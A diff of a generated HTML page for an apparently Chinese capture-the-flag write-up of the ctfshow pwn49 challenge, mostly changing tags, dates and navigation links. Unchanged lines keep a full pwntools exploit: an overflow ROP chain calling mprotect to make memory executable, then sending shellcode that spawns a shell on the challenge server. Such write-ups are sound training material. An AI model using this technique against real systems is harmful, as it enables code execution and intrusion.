@@ -195,11 +195,20 @@
             
                 <span class="meta-info-item post-update-date">
                     <i class="icon fa-solid fa-file-pen"></i>&nbsp;
-                    <span class="datetime" data-updated="Mon Aug 04 2025 12:44:35 GMT+0800">2025-08-04 12:44:35</span>
+                    <span class="datetime" data-updated="Tue Aug 26 2025 17:26:44 GMT+0800">2025-08-26 17:26:44</span>
                 </span>
             
         
 
+        
+            <span class="meta-info-item post-category border-box"><i class="icon fas fa-folder"></i>&nbsp;
+                <ul class="post-category-ul">
+                    
+                            <li class="category-item"><a href="/categories/exercise-pwn/">exercise_pwn</a></li>
+                        
+                    
+                </ul>
+            </span>
         
 
         
@@ -209,10 +218,10 @@
                             <li class="tag-item"><span class="tag-separator"><i class="icon fas fa-hashtag"></i></span><a href="/tags/PWN/">PWN</a></li>
                         
                     
-                            <li class="tag-item"><span class="tag-separator"><i class="icon fas fa-hashtag"></i></span><a href="/tags/ctfshow/">ctfshow</a></li>
+                            <li class="tag-item"><span class="tag-separator"><i class="icon fas fa-hashtag"></i></span><a href="/tags/mprotect/">mprotect</a></li>
                         
                     
-                            <li class="tag-item"><span class="tag-separator"><i class="icon fas fa-hashtag"></i></span><a href="/tags/mprotect/">mprotect</a></li>
+                            <li class="tag-item"><span class="tag-separator"><i class="icon fas fa-hashtag"></i></span><a href="/tags/%E9%9D%99%E6%80%81%E7%BC%96%E8%AF%91/">静态编译</a></li>
                         
                     
                 </ul>
@@ -237,7 +246,8 @@
                     
 
                     
-                         <p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20250726160201265.png"  alt="image-20250726160201265"></p>
+                         <p><a class="link"   target="_blank" rel="noopener" href="https://ctf.show/challenges#pwn49-4059" >题目<i class="fas fa-external-link-alt"></i></a></p>
+<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20250726160201265.png"  alt="image-20250726160201265"></p>
 <p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20250726160211566.png"  alt="image-20250726160211566"></p>
 <p>看出是静态编译，考虑用mprotect来修改它的权限</p>
 <p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20250726161308673.png"  alt="image-20250726161308673"></p>
@@ -250,7 +260,7 @@
 <p>之后控制返回地址让程序回到这个地方执行后门函数</p>
 <h2 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">#p=process(&quot;./pwn49&quot;)</span><br><span class="line">context(arch = &#x27;i386&#x27;,os = &#x27;linux&#x27;,log_level = &#x27;debug&#x27;)</span><br><span class="line">#gdb.attach(p,&quot;b*0x0000000000400737&quot;)</span><br><span class="line">p=remote( &quot;pwn.challenge.ctf.show&quot;,28242)</span><br><span class="line">elf=ELF(&quot;./pwn49&quot;)</span><br><span class="line">edx_ecx_ebx=0x08056194</span><br><span class="line">mprotect=0x0806cdd0</span><br><span class="line">start=0x80DA000</span><br><span class="line">read=elf.sym[&quot;read&quot;]</span><br><span class="line"></span><br><span class="line">payload=b&#x27;a&#x27;*(0x12+4)+p32(mprotect)</span><br><span class="line">payload += p32(edx_ecx_ebx) + p32(start) + p32(1000) + p32(7)</span><br><span class="line">payload+=p32(read)+p32(edx_ecx_ebx)+p32(0)+p32(start)+p32(1000)+p32(start)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">payload=asm(shellcraft.sh())</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
 
-<p>（找pop_ret时只需要控制是pop了三个寄存器就可以）</p>
+<p>（找pop_ret时只需要控制是pop了那三个寄存器就可以）</p>
 <h2 id="mprotect"><a href="#mprotect" class="headerlink" title="mprotect"></a>mprotect</h2><p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20250726160746650.png"  alt="image-20250726160746650"></p>
 <p><code>mprotect</code> 系统调用有严格的页面对齐要求：</p>
 <ol>
@@ -278,11 +288,11 @@
                                     </li>
                                 
                                     <li class="tag-item border-box">
-                                        <i class="icon fas fa-hashtag"></i>&nbsp;<a href="/tags/ctfshow/">ctfshow</a>
+                                        <i class="icon fas fa-hashtag"></i>&nbsp;<a href="/tags/mprotect/">mprotect</a>
                                     </li>
                                 
                                     <li class="tag-item border-box">
-                                        <i class="icon fas fa-hashtag"></i>&nbsp;<a href="/tags/mprotect/">mprotect</a>
+                                        <i class="icon fas fa-hashtag"></i>&nbsp;<a href="/tags/%E9%9D%99%E6%80%81%E7%BC%96%E8%AF%91/">静态编译</a>
                                     </li>
                                 
                             </ul>
@@ -302,13 +312,13 @@
                                 <a class="prev"
                                    rel="prev"
                                    href="/2025/07/29/gyctf-2020-borrowstack/"
-                                   title="gyctf-2020-borrowstack"
+                                   title="gyctf_2020_borrowstack"
                                 >
                                     <span class="left arrow-icon flex-center">
                                         <i class="fas fa-chevron-left"></i>
                                     </span>
                                     <span class="title flex-center">
-                                        <span class="post-nav-title-item text-ellipsis">gyctf-2020-borrowstack</span>
+                                        <span class="post-nav-title-item text-ellipsis">gyctf_2020_borrowstack</span>
                                         <span class="post-nav-item">Prev posts</span>
                                     </span>
                                 </a>
@@ -318,11 +328,11 @@
                             <div class="next-post">
                                 <a class="next"
                                    rel="next"
-                                   href="/2025/07/26/pwn44/"
-                                   title="pwn44"
+                                   href="/2025/07/24/ciscn-2019-es-2/"
+                                   title="ciscn_2019_es_2"
                                 >
                                     <span class="title flex-center">
-                                        <span class="post-nav-title-item text-ellipsis">pwn44</span>
+                                        <span class="post-nav-title-item text-ellipsis">ciscn_2019_es_2</span>
                                         <span class="post-nav-item">Next posts</span>
                                     </span>
                                     <span class="right arrow-icon flex-center">
